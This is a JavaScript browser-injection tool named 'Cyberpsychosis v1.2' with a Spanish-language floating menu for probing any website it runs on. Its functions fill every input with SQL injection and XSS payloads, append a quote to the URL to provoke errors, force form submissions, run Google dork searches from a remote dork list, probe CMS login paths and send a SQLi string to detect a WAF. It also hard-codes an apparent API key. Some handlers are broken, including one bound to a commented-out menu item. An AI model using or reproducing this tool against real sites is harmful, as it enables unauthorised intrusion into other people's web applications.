let mainAct = () => {
  alert(`Cyberpsychosis v1.2`)
  const webMenuHTML = document.createElement('div')
const webMenuCSS = document.createElement('style')
//const webMenuJS = document.createElement('script')
webMenuHTML.setAttribute('class', 'fab-container')
webMenuHTML.setAttribute('id', 'draggableFab')
//webMenuJS.setAttribute('type', 'text/javascript')

const webMenuHTMLinner = `
    <button class="fabBtn"><b><></b></button>
    <div class="fab-menu" id="fabWMenu" style="text-align: center;">
    <p style="color: #fff; font-size: 7px; border-bottom: 1px solid #333; padding: 5px 0;"><b>VPN:</b> <b id="vSt" style= "color: #f00;">Inactivo</b></p>
      <a id="op1"><b>Llenar inputs con 'OR 1=1 (sql)</b></a>
      <a id="op2"><b>Forzar envio de formulario</b></a>
      <a id="op3"><b>Insertar ' en URL (sql)</b></a>
      <a id="op4"><b>Forzar inputs a texto</b></a>
            <select id="dSel" style="background: none;
  border: none;
  border-bottom: 1px solid #ddd;
  color: #fff;
  font-size: 10px;
  outline: 0; padding: 5px 0;">
      <option>Dorks Esp. Latam</option>
      </select>
      <div style="display: flex;">
      <textarea id="drk" type="text" placeholder="Dork"></textarea>
      <a id="op5" style="background: #333; border-bottom: 1px solid #ddd; 
        border-left: 1px solid #ddd;
      color: #fff;display: inline-block; width: 30% !important;"><b>Buscar</b></a>
      </div>
      <a id="op6"><b>Llenar inputs con payload XSS</b></a>
      <!--<a id="op7"><b>Fuerza envío</b></a>-->
      <a id="op8"><b>Detectar CMS</b></a>
      <a id="op9"><b>Detectar WAF</b></a>
    </div>
`

webMenuHTML.innerHTML = webMenuHTMLinner
document.body.append(webMenuHTML)

const webMenuCSSinner = `
@font-face {
  font-family: 'Console';
  src: url('https://cyberpsychosis.onrender.com/fonts/Web437_ACM_VGA_9x16.woff')
  format('woff');
  font-weight: normal;
  font-style: normal;
}
.fab-container {
  position: fixed;
  bottom: 20px;
  right: 20px;
  z-index: 999999999999999;
}

.fabBtn {
  backdrop-filter: blur(3px);
  background-color: rgba(255, 255, 0, 0.5);
  color: rgb(0, 42, 77);
  border: none;
  border-radius: 50%;
  font-family: Console !important;
  width: 60px;
  height: 60px;
  font-size: 24px !important;
  cursor: pointer;
  box-shadow: 0 4px 6px rgba(0,0,0,0.3);
}

.fab-menu {
  color: #fff;
  display: none;
  flex-direction: column;
  font-family: Console;
  position: absolute;
  right: 70px;
  bottom: 0;
  backdrop-filter: blur(3px);
  //background: url('../img/kira.jpeg');
  background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSFOoif5tA6yeFlT7o-xoQ_MZQIUR01E50_Ig0sii_n_K0ieNC6cYq9zFtJ&s=10') no-repeat center center;
      background-size: 100% 100%;
  //background-color: rgba(98, 0, 238, 0.3);
  border-radius: 10px;
  box-shadow: 0 4px 6px rgba(0,0,0,0.2);
  font-size: 10px !important;
  height: 200px;
  overflow: hidden;
  overflow-y: auto;
  opacity: .8;
  width: 200px;
}

.fab-menu a {
  display: inline-block;
  padding: 5px 10px;
  text-align: start;
  text-decoration: none;
  color: #fff;
  border-bottom: 1px solid #ddd;
  width: 100%;
}

.fab-menu a:hover {
  background-color: rgb(0, 42, 77);
  color: rgb(255, 255, 0) !important;
}

.fab-menu a:last-child {
  border-bottom: none;
}

.fab-menu.show {
  display: flex;
}

.fab-menu textarea {
   background: none;
   border: none;
   border-bottom: 1px solid #ddd;
   color: #4AE9FE;
   outline: none;
   padding: 0 0 0 5px;
   width: 70% !important;
}

.fab-menu input:hover {
   background-color: rgb(0, 42, 77);
   //color: rgb(255, 255, 0) !important;
}

.fab-menu select:hover {
  background-color: rgb(0, 42, 77);
  color: rgb(255, 255, 0) !important;
}

`

webMenuCSS.innerHTML = webMenuCSSinner
document.body.append(webMenuCSS)
  
  function toggleMenu() {
  const menu = document.getElementById('fabWMenu');
  menu.classList.toggle('show');
}

const draggable = document.querySelector('.fabBtn');
const container = document.getElementById('draggableFab');
let offsetX, offsetY, isDragging = false;

function setPosition(x, y) {
  draggable.style.left = `${x - offsetX}px`;
  draggable.style.top = `${y - offsetY}px`;
  draggable.style.bottom = 'auto';
  draggable.style.right = 'auto';
}

// Mouse events
draggable.addEventListener('mousedown', (e) => {
  offsetX = e.clientX - container.offsetLeft;
  offsetY = e.clientY - container.offsetTop;
  isDragging = true;
  container.style.cursor = 'grabbing';
  document.body.style.overflow = 'hidden';
});

document.addEventListener('mousemove', (e) => {
  if (isDragging) {
    container.style.left = `${e.clientX - offsetX}px`;
    container.style.top = `${e.clientY - offsetY}px`;
    container.style.bottom = 'auto';
    container.style.right = 'auto';
  }
});

document.addEventListener('mouseup', () => {
  isDragging = false;
  container.style.cursor = 'grab';
  document.body.style.overflow = '';
});

// Igual para touch:
draggable.addEventListener('touchstart', (e) => {
  const touch = e.touches[0];
  offsetX = touch.clientX - container.offsetLeft;
  offsetY = touch.clientY - container.offsetTop;
  isDragging = true;
  document.body.style.overflow = 'hidden';
}, { passive: false });

document.addEventListener('touchmove', (e) => {
  if (!isDragging) return;
  const touch = e.touches[0];
  container.style.left = `${touch.clientX - offsetX}px`;
  container.style.top = `${touch.clientY - offsetY}px`;
  container.style.bottom = 'auto';
  container.style.right = 'auto';
}, { passive: false });

document.addEventListener('touchend', () => {
  isDragging = false;
  document.body.style.overflow = '';
});

document.querySelector('.fabBtn').addEventListener('click', () => {
  toggleMenu()
})

const inptVal = () => {
  const inpts = document.querySelectorAll('input')
  if(!inpts[0]) {
    alert('No se encontraron inputs!')
  } else {
    return inpts
  }
}

document.querySelector('#op1').addEventListener('click', () => {
  const inpts = inptVal()
  
  if(inpts) {
    inpts.forEach((inp) => inp.value = "'OR 1=1 -- -")
  }
})

document.querySelector('#op2').addEventListener('click', () => document.querySelector('form')?submit():alert('No se encontró ningun formulario!'))

document.querySelector('#op3').addEventListener('click', () => location.href = location.href + "'")

document.querySelector('#op4').addEventListener('click', () => {
  const inpts = inptVal()
  if(inpts) {
  inpts.forEach((inp) => inp.addEventListener('input', () => {
    inp.setAttribute('type', 'text')
  })
)}
})

document.querySelector('#op5').addEventListener('click', () => {
  const drk = document.querySelector('#drk').value
  if(drk) location.href = `https://www.google.com/search?q=inurl:${drk}`
})

document.querySelector('#op6').addEventListener('click', () => {
  const inpts = inptVal()
  
  if (inpts) {
  inpts.forEach((el) => {
    el.value = `<script>alert(1)</script>`
  })
  }
})

document.querySelector('#op7').addEventListener('click', () => {
  const form = document.querySelector('form')
  if (!form) return alert('No se encontró ningún formulario.')
  
  let counter = 0
  const interval = setInterval(() => {
    document.querySelectorAll('input[type="text"]').forEach((inp, i) => {
      inp.value = `test${counter}`
    })
    form.submit()
    counter++
    if (counter > 4) clearInterval(interval)
  }, 1500)
})

document.querySelector('#op8').addEventListener('click', () => {
  const checks = [
    { path: '/wp-login.php', cms: 'WordPress' },
    { path: '/administrator', cms: 'Joomla' },
    { path: '/user/login', cms: 'Drupal' },
    { path: '/typo3', cms: 'TYPO3' }
  ]

  checks.forEach(check => {
    fetch(check.path)
      .then(resp => {
        if (resp.status === 200) {
          alert(`Posible CMS detectado: ${check.cms}`)
        }
      })
      .catch(() => {})
  })
})

document.querySelector('#op9').addEventListener('click', () => {
  fetch(`?test=' OR 1=1 --`)
    .then(resp => {
      if (resp.status === 403) {
        alert('¡WAF detectado! (403 Forbidden)')
      } else {
        alert(`No se detectó WAF (status: ${resp.status})`)
      }
    })
    .catch(() => alert('No se pudo verificar WAF'))
})

const vpnChk = (ip) => {
  fetch(`https://vpnapi.io/api/${ip}?key=c59d7206bc964ea88ed4e8605158ec86`)
    .then(response => response.json())
    .then(data => {
      if (data.security.vpn) {
        const vSt = document.querySelector('#vSt')
        vSt.innerHTML = 'Activo'
        vSt.style = 'color: #0f0;'
      }
    })
    .catch(error => console.error('Error:', error))
}

fetch("https://ipapi.co/json")
    .then(response => response.json())
    .then(data => {
      if (data) {
         vpnChk(data.ip)
      }
    })
    .catch(error => console.error('Error:', error))

fetch('https://cyberpsychosis.onrender.com/api/dorks')
  .then(response => response.json())
  .then(data => {
    const dSel = document.querySelector('#dSel')
    //alert(data[0].dork)
    data.forEach((obj) => {
      const opt = document.createElement('option')
      opt.text = obj.dork
      opt.value = obj.dork
      dSel.appendChild(opt)
      dSel.addEventListener('change', () => document.querySelector('#drk').value = dSel.value)
    })
  })
}